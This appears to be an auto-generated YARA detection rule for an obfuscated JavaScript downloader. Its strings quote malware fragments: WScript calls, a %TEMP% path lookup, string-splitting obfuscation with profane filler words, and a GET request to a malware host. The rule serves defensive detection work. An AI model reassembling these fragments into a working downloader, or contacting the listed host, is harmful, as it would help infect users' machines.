rule sig_20160428_c860fad7bc49d016b26fa61ad9accd72 {
  meta:
    description = "datamaliciousorder - file 20160428_c860fad7bc49d016b26fa61ad9accd72.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "419c1bad1e2535c48c85a62ca537bbc433a60765856db4e55f4a5c07cbf8731c"

  strings:
    $s1  = "function SixXhjZejPdxCxbSwkLqy(DjdSovHhqCftAfdXojOnm){XphNglIxiCpoBbaWuvMsd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function SixXhjZejPdxCxbSwkLqy(DjdSovHhqCftAfdXojOnm){XphNglIxiCpoBbaWuvMsd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function WfyRgaZdsOozRubRkqJum() {return XphNglIxiCpoBbaWuvMsd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var XphNglIxiCpoBbaWuvMsd = function VgjEidFnuXcdGufUnzAzl() {return YjcJokUayCvlUfsZqiDwp[TfzSmcTvkXidScvHxnGob](\"WScript\"+\"" ascii
    $s5  = "function QftQlaPvwNzoYfwOlkZjg(LwaOjqFqaChsUhxFpxAfr, MsxCbpRltJmvXdnZgiTbk){XvaDbuMuiCdmJmiNvrToc = XvaDbuMuiCdmJmiNvrToc * 1; " ascii
    $s6  = "return LwaOjqFqaChsUhxFpxAfr - MsxCbpRltJmvXdnZgiTbk;};" fullword ascii
    $s7  = "HxpRscYpwUhpKlgVmaRqk[XolYazJezIqpMyrCjqRfj](\"G\" + \"ET\", \"http://unipan96.ru/xo5ksp\", false);" fullword ascii
    $s8  = "var XphNglIxiCpoBbaWuvMsd = function VgjEidFnuXcdGufUnzAzl() {return YjcJokUayCvlUfsZqiDwp[TfzSmcTvkXidScvHxnGob](\"WScript\"+\"" ascii
    $s9  = "var YjcJokUayCvlUfsZqiDwp = this[\"WScript\"];" fullword ascii
    $s10 = "function WfyRgaZdsOozRubRkqJum() {return XphNglIxiCpoBbaWuvMsd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function EgdKehJpkHayLmoHikAbv(){return ZwiTaoGgeFgoQqiMncXuq + \"\";};" fullword ascii
    $s12 = "function QftQlaPvwNzoYfwOlkZjg(LwaOjqFqaChsUhxFpxAfr, MsxCbpRltJmvXdnZgiTbk){XvaDbuMuiCdmJmiNvrToc = XvaDbuMuiCdmJmiNvrToc * 1; " ascii
    $s13 = "if (HxpRscYpwUhpKlgVmaRqk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function XjqEjdRriLwmSajOuaCki() {return ((IknDtuKnhPdgZqkMwpVje == true) && (IknDtuKnhPdgZqkMwpVje == BcvSyeOgtKrjNnzLguYxu)) ?" ascii
    $s15 = "function XjqEjdRriLwmSajOuaCki() {return ((IknDtuKnhPdgZqkMwpVje == true) && (IknDtuKnhPdgZqkMwpVje == BcvSyeOgtKrjNnzLguYxu)) ?" ascii
    $s16 = "}while (GnzHreJqxHwwZyeVdiAfw);" fullword ascii
    $s17 = "function EpcHdmTlzFnqEieUngZpk(){return TfzSmcTvkXidScvHxnGob;};" fullword ascii
    $s18 = "WfeGtsAvvHhmEgwLuwMkk = true;" fullword ascii
    $s19 = "var BcvSyeOgtKrjNnzLguYxu = false;" fullword ascii
    $s20 = "var TzpZmsFowWeoXvnJlyAuc = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}